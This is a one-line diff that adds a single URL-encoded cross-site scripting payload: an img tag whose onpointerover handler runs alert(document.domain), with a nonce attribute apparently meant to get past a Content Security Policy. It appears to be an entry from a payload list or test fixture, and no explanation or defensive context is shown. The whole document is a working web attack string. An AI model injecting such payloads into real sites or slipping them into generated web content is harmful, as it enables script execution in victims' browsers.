@@ -1,0 +1,1 @@
+<img%20src="x"%20onpointerover="alert(document.domain)"%20nonce="xtO4jAFT">
